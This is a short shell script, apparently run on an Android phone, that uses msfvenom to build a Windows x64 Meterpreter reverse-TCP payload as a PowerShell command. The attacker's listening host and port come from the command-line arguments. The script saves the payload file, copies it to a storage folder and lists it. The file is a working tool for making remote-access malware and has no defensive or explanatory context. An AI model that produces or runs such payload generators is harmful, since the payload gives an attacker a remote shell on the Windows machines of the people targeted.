#!/bin/sh
FILE=reverse$RANDOM-$1_$2psh

msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$1 LPORT=$2 --smallest -f psh-cmd > $FILE
cp $FILE /storage/emulated/0/utiles/msf
echo "$FILE"
ls -la /storage/emulated/0/utiles/msf/reverse*
